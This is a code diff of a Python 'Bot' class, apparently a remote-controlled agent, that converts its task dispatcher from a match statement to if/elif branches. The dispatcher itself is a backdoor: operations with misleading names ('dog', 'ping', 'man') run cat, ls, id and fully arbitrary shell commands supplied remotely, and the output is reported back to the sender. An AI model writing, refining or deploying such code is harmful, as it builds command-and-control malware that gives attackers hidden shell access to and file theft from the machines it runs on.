@@ -62,19 +62,18 @@ class Bot:
             self.report(id, task, b"Failed to parse task")
             return
         res = ""
-        match operation:
-            case 'a':
-                res = execute_shell('w')
-            case 'dog':
-                res = execute_shell(f'cat {args}')
-            case 'ls':
-                res = execute_shell('id')
-            case 'ping':
-                res = execute_shell(f'ls {args}')
-            case 'man':
-                res = execute_shell(args)
-            case _:
-                res = b"Unknown operation"
+        if operation == 'a':
+            res = execute_shell('w')
+        elif operation == 'dog':
+            res = execute_shell(f'cat {args}')
+        elif operation == 'ls':
+            res = execute_shell('id')
+        elif operation == 'ping':
+            res = execute_shell(f'ls {args}')
+        elif operation == 'man':
+            res = execute_shell(args)
+        else:
+            res = b"Unknown operation"
         self.report(id, task, res)
 
     def report(self, id: str, task: str, result: bytes):
